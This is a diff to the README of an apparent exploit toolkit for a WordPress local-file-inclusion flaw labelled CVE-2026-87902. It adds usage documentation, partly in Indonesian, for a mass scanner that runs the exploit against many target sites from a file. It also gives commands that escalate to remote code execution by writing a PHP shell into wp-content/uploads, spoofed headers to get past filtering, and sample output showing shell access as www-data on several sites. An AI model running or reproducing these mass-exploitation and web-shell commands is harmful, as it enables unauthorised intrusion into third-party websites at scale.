@@ -45,9 +45,18 @@ pip install requests
 
 ---
 
-## Usage
+## Files
 
-### Basic scan (auto-detect everything)
+| File | Description |
+|---|---|
+| `poc.py` | Single target scanner — full LFI/RCE exploit |
+| `mass.py` | Mass scanner — scan banyak target dari file sekaligus |
+
+---
+
+## poc.py — Single Target
+
+### Basic scan
 
 ```bash
 python3 poc.py https://target.com
@@ -77,7 +86,7 @@ python3 poc.py https://target.com --rce -v
 python3 poc.py https://target.com --rce --write-path /var/www/html/wp-content/uploads/shell.php -v
 ```
 
-### JSON output (for scripting / chaining)
+### JSON output
 
 ```bash
 python3 poc.py https://target.com --json
@@ -118,15 +127,7 @@ python3 poc.py https://target.com --cookie "wordpress_logged_in_xxx=user%7C..." 
 python3 poc.py https://target.com -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1"
 ```
 
-### Increase thread count for faster scanning
-
-```bash
-python3 poc.py https://target.com --thorough --threads 20 -v
-```
-
----
-
-## All Flags
+### All Flags — poc.py
 
 | Flag | Default | Description |
 |---|---|---|
@@ -143,6 +144,125 @@ python3 poc.py https://target.com --thorough --threads 20 -v
 | `--page-id N` | — | Override: skip page discovery, use this page_id |
 | `-t / --theme NAME` | — | Override: skip theme enum, use this theme |
 | `-d / --depth N` | — | Override: use only this traversal depth |
+
+---
+
+## mass.py — Mass Scanner
+
+Scan ratusan target sekaligus dari satu file. Setiap target dijalankan secara concurrent, hasil otomatis disimpan ke folder output.
+
+### Setup targets
+
+Buat file `targets.txt` (satu URL per baris, baris `#` diabaikan):
+
+```
+https://site1.com
+https://site2.com
+http://site3.com
+# ini komentar, diabaikan
+https://site4.com
+```
+
+### Basic scan
+
+```bash
+python3 mass.py targets.txt
+```
+
+### Dengan RCE + lebih cepat
+
+```bash
+python3 mass.py targets.txt --rce --mass-threads 10 --threads 15
+```
+
+### Thorough mode
+
+```bash
+python3 mass.py targets.txt --thorough --mass-threads 5
+```
+
+### Output JSON
+
+```bash
+python3 mass.py targets.txt --format json --output hasil/
+```
+
+### Dengan delay antar target (hindari rate limit)
+
+```bash
+python3 mass.py targets.txt --delay 1.5
+```
+
+### Custom cookie + header untuk semua target
+
+```bash
+python3 mass.py targets.txt --cookie "session=abc123" -H "X-Forwarded-For: 127.0.0.1"
+```
+
+### All Flags — mass.py
+
+| Flag | Default | Description |
+|---|---|---|
+| `targets` | (required) | File berisi daftar URL target |
+| `--mass-threads N` | `5` | Jumlah target yang berjalan bersamaan |
+| `--threads N` | `10` | Thread per target (LFI probe) |
+| `--rce` | off | Coba RCE kalau LFI berhasil |
+| `--write-path PATH` | `/tmp/wp_shell.php` | PHP stub path untuk RCE |
+| `--thorough` | off | Probe semua theme + brute page IDs |
+| `--port N` | auto | Override port |
+| `--cookie STR` | — | Cookie header |
+| `-H HEADER` | — | Extra HTTP header (repeatable) |
+| `--output DIR` | `mass_results` | Folder output |
+| `--format` | `txt` | Format output: `txt` atau `json` |
+| `--delay N` | `0` | Jeda detik antar target |
+| `--theme NAME` | — | Force theme name (skip enum) |
+| `--page-id N` | — | Force page_id (skip discovery) |
+| `--depth N` | — | Force traversal depth |
+
+### Output Files
+
+Hasil disimpan otomatis ke folder `mass_results/` (atau `--output`):
+
+```
+mass_results/
+├── vuln_20261026_143022.txt    ← target vulnerable (LFI confirmed)
+├── waf_20261026_143022.txt     ← target kena WAF/blocked
+├── dead_20261026_143022.txt    ← target tidak vulnerable
+└── results_20261026_143022.json  ← (kalau --format json)
+```
+
+### Contoh Output
+
+```
+╔═══════════════════════════════════════════════════════════════╗
+║  CVE-2026-87902 — WordPress LFI Mass Scanner                 ║
+╚═══════════════════════════════════════════════════════════════╝
+[*] Targets      : 50
+[*] Mass threads : 10
+[*] Per-target   : 10 threads
+[*] RCE          : True
+[*] Output dir   : mass_results
+
+[1/50] [VULN] https://site1.com
+        LFI: page_id=2 theme=astra depth=8
+        RCE: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+[2/50] [WAF]  https://site2.com (Cloudflare/Imunify360)
+[3/50] [-]    https://site3.com
+...
+
+=================================================================
+SCAN COMPLETE  — 50 targets
+  VULNERABLE : 12
+  RCE        : 8
+  WAF BLOCKED: 15
+  NOT VULN   : 23
+=================================================================
+
+[*] Results saved to: mass_results/
+    vuln_20261026_143022.txt  — 12 vulnerable
+    waf_20261026_143022.txt   — 15 WAF blocked
+    dead_20261026_143022.txt  — 23 not vulnerable
+```
 
 ---
 
@@ -194,7 +314,7 @@ When WAF is detected, the script reports the type and exits cleanly — no false
 
 ---
 
-## Example Output
+## Example Output — poc.py
 
 ```
 ╔═══════════════════════════════════════════════════════════════╗
